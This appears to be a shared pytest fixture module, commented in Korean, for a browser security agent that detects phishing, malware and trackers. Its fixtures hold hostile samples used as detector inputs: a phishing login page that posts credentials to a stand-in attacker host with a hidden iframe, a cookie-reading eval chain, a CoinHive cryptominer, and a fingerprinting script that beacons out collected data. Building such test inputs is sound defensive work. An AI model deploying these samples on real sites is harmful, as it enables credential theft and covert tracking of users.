"""
pytest 공용 fixture 모듈
========================

모든 Python 테스트에서 공유하는 fixture를 정의합니다.

fixture 목록:
- mock_config: 테스트용 AgentConfig (API 키 없이 동작)
- mock_llm: 모의 LLM 추론 엔진
- sample_urls: 피싱/안전/의심 URL 모음
- sample_js_code: 악성/안전 JavaScript 코드 샘플
- sample_html: 피싱/안전 HTML 페이지 샘플
- temp_db: 임시 SQLite 데이터베이스 경로
"""

from __future__ import annotations

import asyncio
import os
import tempfile
from pathlib import Path
from typing import AsyncGenerator, Generator
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from agent.core.config import AgentConfig, LLMConfig, ThreatConfig


# ============================================================
# 이벤트 루프 설정 (pytest-asyncio)
# ============================================================

@pytest.fixture(scope="session")
def event_loop():
    """세션 범위 이벤트 루프 — 모든 async 테스트에서 공유"""
    loop = asyncio.new_event_loop()
    yield loop
    loop.close()


# ============================================================
# 설정 fixture
# ============================================================

@pytest.fixture
def mock_config() -> AgentConfig:
    """
    테스트용 AgentConfig

    API 키 없이 동작하며, 임계값을 낮춰서 테스트가
    위협을 쉽게 탐지하도록 설정합니다.
    """
    config = AgentConfig(
        agent_name="test-security-agent",
        version="1.0.0-test",
        debug=True,
        log_level="DEBUG",
        data_dir=tempfile.mkdtemp(prefix="ordinal_test_"),
        llm=LLMConfig(
            api_key="",  # API 키 없음 — LLM 호출 비활성화
            model_name="gpt-4",
            temperature=0.0,
            max_tokens=512,
            use_local_fallback=False,
            cache_enabled=True,
            cache_ttl_seconds=60,
            cache_max_size=100,
            max_retries=1,
            retry_base_delay=0.1,
        ),
        threats=ThreatConfig(
            phishing_threshold=0.5,      # 테스트용으로 임계값 낮춤
            malware_threshold=0.4,
            xss_threshold=0.4,
            privacy_threshold=0.4,
            overall_danger_threshold=0.5,
            safe_score_minimum=60,
        ),
    )
    return config


# ============================================================
# 모의 LLM fixture
# ============================================================

@pytest.fixture
def mock_llm() -> AsyncMock:
    """
    모의 LLM 추론 엔진

    실제 API 호출 없이 미리 정의된 응답을 반환합니다.
    """
    mock = AsyncMock()

    # 기본 응답: 안전 판정
    mock.generate.return_value = {
        "threat_level": "SAFE",
        "threat_types": [],
        "confidence": 0.1,
        "reasoning": "테스트 모의 응답: 안전한 콘텐츠입니다.",
        "indicators": [],
        "recommendation": "안전합니다.",
    }

    return mock


# ============================================================
# 샘플 URL fixture
# ============================================================

@pytest.fixture
def sample_urls() -> dict[str, list[str]]:
    """
    테스트용 URL 모음

    카테고리별로 분류된 URL 목록을 제공합니다.
    """
    return {
        # 안전한 URL (HTTPS, 유명 도메인)
        "safe": [
            "https://www.google.com/search?q=python",
            "https://github.com/KaztoRay/ordinal-browser",
            "https://docs.python.org/3/library/asyncio.html",
            "https://www.naver.com",
            "https://ko.wikipedia.org/wiki/Python",
        ],
        # 피싱 의심 URL (IP 주소, 타이포스쿼팅, 의심 TLD)
        "phishing": [
            "http://192.168.1.100/secure/login.php",
            "https://gooogle.com/signin",
            "http://paypa1.com.suspicious.tk/verify",
            "http://login-microsoft-secure.xyz/auth",
            "https://amaz0n-security.club/update-payment",
        ],
        # 추적기 URL
        "tracker": [
            "https://www.google-analytics.com/analytics.js",
            "https://connect.facebook.net/en_US/fbevents.js",
            "https://bat.bing.com/actionp/0",
            "https://pixel.facebook.com/tr",
            "https://wcs.naver.net/wcslog.js",
        ],
    }


# ============================================================
# 샘플 JavaScript 코드 fixture
# ============================================================

@pytest.fixture
def sample_js_code() -> dict[str, str]:
    """
    테스트용 JavaScript 코드 샘플

    악성/안전/난독화된 코드를 제공합니다.
    """
    return {
        # 안전한 코드
        "clean": """
            function greetUser(name) {
                const greeting = "안녕하세요, " + name + "님!";
                document.getElementById("output").textContent = greeting;
                console.log(greeting);
            }
            greetUser("사용자");
        """,
        # eval 체인 (악성)
        "eval_chain": """
            var encoded = "ZG9jdW1lbnQuY29va2ll";
            var decoded = atob(encoded);
            eval(decoded);
            eval(String.fromCharCode(97,108,101,114,116,40,49,41));
            new Function("return document.cookie")();
        """,
        # 난독화된 코드 (의심)
        "obfuscated": """
            var _0x4f2a=['\\x63\\x6f\\x6e\\x73\\x6f\\x6c\\x65',
                '\\x6c\\x6f\\x67','\\x48\\x65\\x6c\\x6c\\x6f'];
            var _0x5b3c=function(_0x4f2ax1){
                _0x4f2ax1=_0x4f2ax1-0x0;
                var _0x4f2ax2=_0x4f2a[_0x4f2ax1];
                return _0x4f2ax2;
            };
            window[_0x5b3c(0x0)][_0x5b3c(0x1)](_0x5b3c(0x2));
        """,
        # 크립토마이너 (악성)
        "crypto_miner": """
            var miner = new CoinHive.Anonymous('site-key-abc123');
            miner.start();
            var ws = new WebSocket('wss://pool.mining.com/stratum');
            ws.onmessage = function(e) { processHash(e.data); };
        """,
    }


# ============================================================
# 샘플 HTML fixture
# ============================================================

@pytest.fixture
def sample_html() -> dict[str, str]:
    """
    테스트용 HTML 페이지 샘플

    피싱/안전/추적기 포함 페이지를 제공합니다.
    """
    return {
        # 안전한 페이지
        "clean": """
            <!DOCTYPE html>
            <html lang="ko">
            <head>
                <meta charset="UTF-8">
                <title>안전한 페이지</title>
                <link rel="stylesheet" href="/styles.css">
            </head>
            <body>
                <header><h1>환영합니다</h1></header>
                <main>
                    <p>이것은 안전한 웹 페이지입니다.</p>
                    <a href="/about">소개</a>
                </main>
                <footer>Copyright 2026</footer>
            </body>
            </html>
        """,
        # 피싱 페이지 (로그인 폼, 비밀번호 필드, 외부 리소스)
        "phishing": """
            <!DOCTYPE html>
            <html>
            <head><title>계정 확인 - 보안 업데이트 필요</title></head>
            <body oncontextmenu="return false">
                <div style="display:none">
                    <iframe src="https://evil.com/hidden"></iframe>
                </div>
                <form action="https://evil-collector.tk/steal" method="POST"
                      id="login-form" class="signin">
                    <h2>계정을 확인하세요</h2>
                    <p>unusual activity가 감지되었습니다. verify your account를 진행하세요.</p>
                    <input type="text" name="username" placeholder="이메일">
                    <input type="password" name="password" placeholder="비밀번호">
                    <input type="hidden" name="token" value="steal-data">
                    <button type="submit">확인</button>
                </form>
                <script>
                    setTimeout(function(){document.getElementById('login-form').submit()},5000);
                </script>
                <img src="https://tracker.evil.com/pixel.gif" width="1" height="1">
                <link rel="icon" href="https://other-domain.com/favicon.ico">
            </body>
            </html>
        """,
        # 추적기가 많은 페이지
        "tracker_heavy": """
            <!DOCTYPE html>
            <html>
            <head>
                <title>추적기 테스트</title>
                <script src="https://www.google-analytics.com/analytics.js"></script>
                <script src="https://connect.facebook.net/en_US/fbevents.js"></script>
            </head>
            <body>
                <p>콘텐츠</p>
                <script src="https://bat.bing.com/bat.js"></script>
                <script src="https://www.googletagmanager.com/gtm.js"></script>
                <script>
                    // Canvas 핑거프린팅
                    var canvas = document.createElement('canvas');
                    var ctx = canvas.getContext('2d');
                    ctx.fillText('fingerprint', 10, 10);
                    var data = canvas.toDataURL();

                    // WebGL 핑거프린팅
                    var gl = canvas.getContext('webgl');
                    var ext = gl.getExtension('WEBGL_debug_renderer_info');
                    var renderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);

                    // navigator 속성 수집
                    var fp = {
                        plugins: navigator.plugins,
                        languages: navigator.languages,
                        hardwareConcurrency: navigator.hardwareConcurrency,
                        deviceMemory: navigator.deviceMemory,
                    };
                    navigator.sendBeacon('https://collect.example.com/fp', JSON.stringify(fp));
                </script>
                <img src="https://pixel.facebook.com/tr?ev=PageView" width="1" height="1">
            </body>
            </html>
        """,
    }


# ============================================================
# 임시 데이터베이스 fixture
# ============================================================

@pytest.fixture
def temp_db(tmp_path: Path) -> str:
    """
    임시 SQLite 데이터베이스 파일 경로

    테스트 종료 시 자동으로 정리됩니다.
    """
    db_path = str(tmp_path / "test_threats.db")
    return db_path
